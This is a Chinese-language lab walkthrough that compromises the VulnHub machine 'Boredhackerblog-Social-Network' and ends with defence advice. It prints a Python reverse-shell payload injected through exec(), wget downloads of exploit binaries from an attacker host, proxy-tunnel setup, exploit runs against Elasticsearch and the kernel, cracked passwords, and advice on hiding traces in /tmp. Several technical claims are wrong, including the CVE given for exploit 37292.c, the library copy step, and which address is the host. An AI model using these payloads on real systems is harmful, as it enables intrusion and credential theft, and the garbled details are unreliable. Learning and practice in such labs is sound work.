---
title: VulnHub Boredhackerblog-Social-Network 渗透测试完整复现
description: 记录 VulnHub 靶机 Boredhackerblog-Social-Network 的完整渗透测试复现流程：从 Web 代码注入获取容器
  Shell、Docker 环境识别与内网探测、代理隧道搭建实现横向移动、宿主机服务漏洞利用（Elasticsearch CVE-2015-1427）、密码哈希破解至
  SSH 登录、Linux 内核 CVE-2013-2094 本地提权及编译绕过技巧的全链路实战。
category: program-analysis
tags:
- VulnHub
- 渗透测试
- 代码注入
- Docker逃逸
- 内网穿透
- 横向移动
- Elasticsearch
- CVE-2015-1427
- 密码破解
- SSH登录
- 本地提权
- CVE-2013-2094
- OSCP备考
date: 2024-01-15
updated: '2026-11-14'
---

## 概述

本文档完整复现 VulnHub 靶机 **Boredhackerblog-Social-Network** 的渗透测试攻击链。该靶机模拟了一个部署在 Docker 容器中的社交网络应用，攻击路径涵盖 Web 层代码注入、容器环境识别、内网探测与代理搭建、宿主机服务漏洞利用、凭据窃取与破解、SSH 登录及内核漏洞本地提权的完整实战流程。

> **靶机来源**：[VulnHub - Boredhackerblog-Social-Network](https://www.vulnhub.com/entry/boredhackerblog-social-network,454/)  
> **适用场景**：OSCP 风格实战练习、Docker 环境渗透测试、内网横向移动技术演练、Linux 内核漏洞利用实战

---

## 攻击链全景图

```mermaid
graph TD
    A[主机发现与端口扫描] --> B[Web 目录枚举发现 /admin]
    B --> C[Python exec() 代码注入反弹 Shell]
    C --> D[Docker 容器环境确认]
    D --> E[内网存活主机探测 172.17.0.0/16]
    E --> F[Venom 反向 SOCKS5 代理隧道搭建]
    F --> G[Proxychains 配置工具链代理]
    G --> H[内网服务扫描发现 Elasticsearch 9200]
    H --> I[CVE-2015-1427 RCE 获取宿主机 Root Shell]
    I --> J[MD5 哈希窃取与破解]
    J --> K[SSH 登录 john 用户]
    K --> L[CVE-2013-2094 本地提权获取 Root]
```

---

## 信息收集与服务枚举

### 主机发现

攻击机（Kali 192.168.0.114）与目标靶机处于同一网段，使用 ARP 扫描快速定位目标 IP：

```bash
arp-scan -l
# 或
sudo nmap -sn 192.168.0.0/24
```

确定目标 IP 为 `192.168.0.113`。

### 端口扫描与服务版本探测

```bash
# TCP 连接扫描，禁用 Ping 探测
nmap -sT -Pn 192.168.0.113

# 针对开放端口进行版本探测
nmap -p22,5000 -sV -sT -Pn 192.168.0.113
```

扫描结果：
- **22/tcp** - SSH (OpenSSH)
- **5000/tcp** - HTTP (Python HTTP 服务，Ubuntu 环境)

---

## Web 应用攻击面分析

### 目录枚举

使用 `dirsearch` 对 Web 目录进行爬取：

```bash
dirsearch -u http://192.168.0.113:5000
```

发现隐藏后台管理页面：`/admin`。

### 代码注入漏洞利用 (Python exec() RCE)

访问 `/admin` 页面，发现这是一个代码测试页面，用户输入直接传递给 Python `exec()` 函数执行，存在 **任意代码执行** 漏洞。

> **技术原理**：`exec()` 函数可执行任意 Python 代码块，区别于仅接受单一表达式的 `eval()`。若无输入过滤，攻击者可注入任意 Python 语句。

构造 Python 反弹 Shell Payload：

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.114",6666))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

在 Kali 监听：

```bash
nc -nvlp 6666
```

点击 "Test code" 执行，成功获取 **Docker 容器内的 Root Shell**（容器内默认以 root 运行）。

---

## 容器环境识别与内网侦察

### 确认 Docker 环境

在容器内执行以下命令验证：

```bash
# 方法 1：检查 .dockerenv 文件
ls /.dockerenv

# 方法 2：检查 PID 1 的 cgroup 信息
cat /proc/1/cgroup
# 输出包含 "docker" 字样即确认为容器
```

> **判断依据**：Linux 初始化进程 PID=1，若其 cgroup 文件包含 docker 关键字，说明进程运行在 Docker 容器中。

查看 `Dockerfile` 确认镜像构建信息：

```bash
cat Dockerfile
# FROM python:2.7-alpine
# COPY . /app
# WORKDIR /app
# RUN pip install -r requirements.txt
# CMD ["python", "/app/main.py"]
```

### 内网网段探测

查看容器网络配置：

```bash
ip a
# 发现容器 IP 为 172.17.0.3，处于 Docker 默认 bridge 网段 172.17.0.0/16
```

编写 Bash 脚本批量 Ping 探测存活主机：

```bash
# 单网段扫描
for i in $(seq 1 10); do ping -c 1 172.17.0.$i; done

# 结果：发现 172.17.0.1（网关/宿主机）、172.17.0.2（内网服务）、172.17.0.3（当前容器）
```

---

## 代理隧道搭建与横向移动

### Venom 反向 SOCKS5 代理部署

由于攻击机无法直连内网段，需在容器上建立代理隧道。使用 **Venom** 轻量级反向代理工具。

**工具获取**：
- GitHub Releases: https://github.com/Dliv3/Venom/releases
- 所需文件：`admin_linux_x64` (服务端/攻击机)、`agent_linux_x64` (客户端/靶机)

**攻击机启动服务端监听**：

```bash
./admin_linux_x64 -lport 7777
```

**攻击机开启 HTTP 服务传输客户端**：

```bash
python3 -m http.server 81
```

**容器内下载并启动客户端**：

```bash
wget http://192.168.0.114:81/agent_linux_x64
chmod +x agent_linux_x64
./agent_linux_x64 -rhost 192.168.0.114 -rport 7777
```

**建立 SOCKS5 代理隧道**：

攻击机 Venom 交互模式下：
```
show           # 查看已连接节点
goto 1         # 进入节点 1 (容器)
socks 1080     # 在节点上开启 SOCKS5 监听端口 1080
```

### Proxychains 工具链代理配置

修改 `/etc/proxychains4.conf` 使所有工具流量走代理：

```
# 将原 socks4 127.0.0.1 9050 修改为：
socks5 127.0.0.1 1080
```

验证代理生效：

```bash
proxychains nmap -sT -Pn 172.17.0.1
```

> **技术对比**：类似场景下亦可使用 [[frp内网渗透应用]] 中的 frp Socks5 模式、reGeorg、Chisel 等工具建立隧道。

---

## 宿主机服务发现与漏洞利用

### 内网服务扫描

通过代理对内网存活主机进行端口扫描：

```bash
# 扫描网关/宿主机内网接口
proxychains nmap -Pn -sT 172.17.0.1
# 发现开放 22、5000 端口，与 192.168.0.113 一致，确认为宿主机内网 IP

# 扫描内网服务主机
proxychains nmap -Pn -sT 172.17.0.2
# 发现开放 9200 端口

# 服务版本探测
proxychains nmap -Pn -sT -p9200 -sV 172.17.0.2
# 识别为 Elasticsearch 服务，版本较老
```

### Elasticsearch CVE-2015-1427 RCE 利用

**漏洞背景**：Elasticsearch 1.4.2 及更早版本的 Groovy 脚本引擎存在沙箱绕过，允许远程代码执行 (CVE-2015-1427，EDB-ID 36337)。

**Exploit-DB 搜索与获取**：

```bash
searchsploit Elasticsearch
# 定位到 exploits/linux/remote/36337.py (Python 2 脚本)

cp /usr/share/exploitdb/exploits/linux/remote/36337.py .
```

**通过代理执行远程利用**：

```bash
proxychains python2 36337.py 172.17.0.2
```

成功在 **宿主机 (172.17.0.2)** 获取 **Root Shell**。

---

## 凭据窃取与破解

### 敏感文件搜集

宿主机 Shell 下枚举文件系统：

```bash
ls /root
ls /home
find / -name "password*" -type f 2>/dev/null
```

发现 `passwords` 文件，内容包含用户名与 MD5 哈希值：

```
john:3f8184a7343664553fcb5337a3138814
test:861f194e9d6118f3d942a72be3e51749
admin:670c3bbc209a18dde5446e5e6c1f1d5b
root:b3d34352fc26117979deabdf1b9b6354
jane:5c158b60ed97c723b673529b8a3cf72b
```

### MD5 哈希破解

使用在线破解平台或本地工具破解：

```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# 格式需为：username:hash

# Hashcat (模式 0 = MD5)
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**破解结果**：
- `john` -> **`1337hack`** (唯一可登录账户)
- 其他哈希未在字典中命中

> **补充**：MD5 为单向散列函数，无盐值时易受彩虹表/字典攻击。详见 [[0w1club-week11-crypto-re-pwn-training]]、[[ctf-show-php-command-execution-bypass-techniques]]、[[lm-ntlm-hash-generation-analysis]] 关于哈希破解技术的深度解析。

---

## SSH 登录与本地提权

### SSH 认证登录

使用破解得到的凭据登录宿主机 SSH (192.168.0.113:22)：

```bash
ssh john@192.168.0.113
# Password: 1337hack
```

成功获得宿主机低权限用户 Shell。尝试 `sudo -s` 提权失败，需本地提权。

---

## Linux 内核 CVE-2013-2094 本地提权

### 内核版本确认

```bash
uname -a
# Linux socnet 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64
```

内核版本 **3.13.0-24-generic** 受影响于 **CVE-2013-2094** (perf_event_open 权限提升)。

### Exploit-DB 搜索与适配

```bash
searchsploit linux 3.13
# 定位到 exploits/linux/local/37292.c

cp /usr/share/exploitdb/exploits/linux/local/37292.c .
```

### 编译环境绕过技巧

**问题分析**：靶机宿主机 **无 gcc 编译环境**，Exp 末尾调用 `gcc` 编译 `ofs-lib.c` 会失败。

**解决方案**：**攻击机预编译**，仅上传编译产物。

1. **攻击机本地编译**：
   ```bash
   # 查看 Exp 源码，确认编译逻辑
   vim 37292.c
   # 发现会编译 ofs-lib.c 生成 ofs-lib.so
   
   # 攻击机编译 (需安装 gcc-multilib 等依赖)
   gcc -o exp2 37292.c
   # 或分步编译：
   gcc -shared -fPIC -o ofs-lib.so ofs-lib.c
   gcc -o exp2 37292.c  # 修改源码移除编译调用，直接 dlopen("./ofs-lib.so")
   ```

2. **寻找并复制动态库**：
   ```bash
   find /usr -name "ofs-lib.so" 2>/dev/null
   cp /usr/lib/x86_64-linux-gnu/ofs-lib.so .  # 典型路径
   ```

3. **上传文件至靶机 `/tmp` 目录**：
   ```bash
   # 攻击机开启 HTTP 服务
   python3 -m http.server 81
   
   # 靶机下载
   cd /tmp
   wget http://192.168.0.114:81/exp2
   wget http://192.168.0.114:81/ofs-lib.so
   chmod +x exp2
   ```

> **技巧总结**：
> - `/tmp` 目录权限宽松、定期清理，利于隐藏攻击痕迹
> - 预编译绕过目标机缺编译链工具链的通用手法
> - 类似场景见 [[peda-buffer-overflow-analysis-guide]] 中的 Exp 编译部署、[[vulnhub-dawn2-writeup]] Windows 溢出利用编译

### 提权执行

```bash
./exp2
# 成功获取 Root Shell
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## 关键技术点总结

| 阶段 | 核心技术 | 工具/命令 | 关键难点与对策 |
|------|----------|-----------|----------------|
| **初始立足** | Python `exec()` 代码注入 | dirsearch, Python 反弹 Shell | 无过滤直接 RCE，构造 `socket` + `dup2` + `subprocess` Payload |
| **环境识别** | Docker 容器指纹识别 | `/.dockerenv`, `/proc/1/cgroup` | 区分容器与宿主机网络拓扑，确认内网网段 172.17.0.0/16 |
| **内网穿透** | Venom 反向 SOCKS5 代理 | Venom admin/agent, `socks 1080` | 穿越 NAT、防火墙限制，建立攻击机到内网的通信通道 |
| **工具链代理** | Proxychains 全局代理 | `/etc/proxychains4.conf` | 使 nmap、searchsploit、python 等工具透明走代理 |
| **横向移动** | 代理链端口扫描 + 服务识别 | `proxychains nmap -sT -sV` | 扫描速度与噪音控制，识别 Elasticsearch 9200 |
| **漏洞利用** | Elasticsearch CVE-2015-1427 RCE | Exploit-DB 36337.py (Python 2) | 老旧 EXP 依赖 Python 2 环境，通过代理远程触发 |
| **凭据获取** | 文件搜集 + MD5 离线破解 | find, john/hashcat, rockyou.txt | 无盐 MD5 弱哈希易破解，仅 john 账户可复用 |
| **本地提权** | Linux Kernel CVE-2013-2094 | Exploit-DB 37292.c (perf_event_open) | **目标机无 gcc，攻击机预编译上传 so 文件绕过** |
| **痕迹隐藏** | 临时目录操作 | `/tmp` 目录存放工具与产物 | 系统定期清理 `/tmp`，降低取证风险 |

---

## 防御与缓解建议

### 代码层面
1. **严禁危险函数**：禁止将用户可控输入直接拼接进 `exec()`/`eval()`/`system()` 等函数；采用白名单校验或沙箱执行环境。
2. **最小权限原则**：容器内服务以非 root 用户运行，降低初始立足点权限。

### 容器与网络隔离
1. **容器安全加固**：
   - 启用 `--cap-drop=ALL` 丢弃所有 Capability，按需添加
   - 使用 `user namespace` 隔离 UID/GID 映射
   - 部署 Falco、Sysdig、Tracee 等运行时安全监控
2. **网络微隔离**：
   - 容器网络与宿主机管理网络物理/逻辑隔离
   - 实施 Egress 防火墙规则，禁止容器主动发起反向连接
   - Docker 网络模式避免使用 `host` 模式，使用 `bridge`/`overlay` 并配置网络策略

### 服务与漏洞管理
1. **组件版本管控**：及时升级 Elasticsearch 等中间件至修复版本 (CVE-2015-1427 已在 1.4.3+ 修复)
2. **暴露面最小化**：宿主机仅暴露必要服务端口，内网服务 (如 9200) 严禁绑定 0.0.0.0
3. **内核补丁管理**：定期应用内核安全补丁，启用 Live Patching (KernelCare/KGraft) 缩短窗口期

### 凭据与访问控制
1. **强哈希策略**：禁用 MD5/SHA1 存储密码，强制使用 Argon2id/bcrypt/scrypt + 高成本因子 + 唯一盐值
2. **SSH 加固**：
   - 禁用密码认证，强制密钥登录 (`PasswordAuthentication no`)
   - 限制允许登录用户/组 (`AllowUsers`, `AllowGroups`)
   - 部署 Fail2Ban/SSHGuard 防暴力破解
3. **特权账户管理**：避免在文件中明文/弱哈希存储凭据，使用 Vault、Sealed Secrets 等密钥管理系统

---

## 相关资源与延伸阅读

- [[vulnhub-platform-resource-index]] — VulnHub 靶场平台资源合集与学习路径
- [[vulnhub-doubletrouble-writeup]] — Shellshock (CVE-2014-6271) + Dirty COW (CVE-2016-5195) 经典提权链复现
- [[vulnhub-hard-socnet2-writeup]] — 高难度社交网络靶机：文件上传、SQLi、CVE-2021-3493 内核提权、二进制缓冲区溢出
- [[vulnhub-pwned-writeup]] — Docker 组权限逃逸提权实战
- [[0w1club-training-shellshock-cgi-exploitation]] — Shellshock 漏洞原理与 CGI 环境变量注入实战
- [[peda-buffer-overflow-analysis-guide]] — PEDA 调试 Linux 缓冲区溢出与 ROP 链构造
- [[frp内网渗透应用]] — frp Socks5/多级隧道/Metasploit 代理实战全场景
- [[named-pipe-smb-detection-sysmon]] — SMB 命名管道横向移动检测与防御 (蓝队视角)
- [[linux-kernel-hardening-mechanisms]] — Linux 内核主流防御机制体系化梳理

---

## 附录：常用命令速查表

```bash
# 1. 主机发现 (同网段)
arp-scan -l
# 或
nmap -sn 192.168.x.0/24

# 2. 全端口版本探测
nmap -p- -sV -A target

# 3. Web 目录枚举
dirsearch -u http://target:port -e php,html,txt,bak,py

# 4. Docker 环境判断
ls /.dockerenv && cat /proc/1/cgroup | grep -i docker

# 5. 内网存活扫描 (Bash 一行)
for i in {1..254}; do timeout 1 ping -c 1 172.17.0.$i >/dev/null && echo "172.17.0.$i up"; done

# 6. Venom 反向代理部署
# 攻击机: ./admin_linux_x64 -lport 7777
# 靶机:   ./agent_linux_x64 -rhost <ATTACKER_IP> -rport 7777
# 交互:   goto 1 -> socks 1080

# 7. Proxychains 配置
echo "socks5 127.0.0.1 1080" > /etc/proxychains4.conf

# 8. 代理扫描内网主机
proxychains nmap -sT -Pn -p 22,80,9200,5000 172.17.0.1 172.17.0.2

# 9. Exploit-DB 搜索与获取
searchsploit "elasticsearch"
cp /usr/share/exploitdb/exploits/linux/remote/36337.py .

# 10. 通过代理执行 Python 2 EXP
proxychains python2 36337.py 172.17.0.2

# 11. MD5 哈希破解
# John 格式: username:hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Hashcat 模式 0 = MD5
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# 12. SSH 登录
ssh username@target_ip

# 13. 内核版本检查与提权 EXP 搜索
uname -a
searchsploit "linux kernel 3.13"

# 14. 攻击机预编译提权 EXP (绕过目标无 gcc)
gcc -shared -fPIC -o ofs-lib.so ofs-lib.c
gcc -o exp 37292.c  # 修改源码移除编译步骤，直接加载 ofs-lib.so

# 15. 靶机部署提权工具
cd /tmp
wget http://ATTACKER_IP:8000/exp
wget http://ATTACKER_IP:8000/ofs-lib.so
chmod +x exp
./exp
```

---

> **免责声明**：本文档仅供授权渗透测试、CTF 竞赛、安全研究与教学使用。未经书面许可对非授权目标实施攻击属违法行为，作者不承担任何法律责任。

## 来源

- [0x00实验室-202108-202304_066](../sources/0x00实验室-202108-202304_066.md)
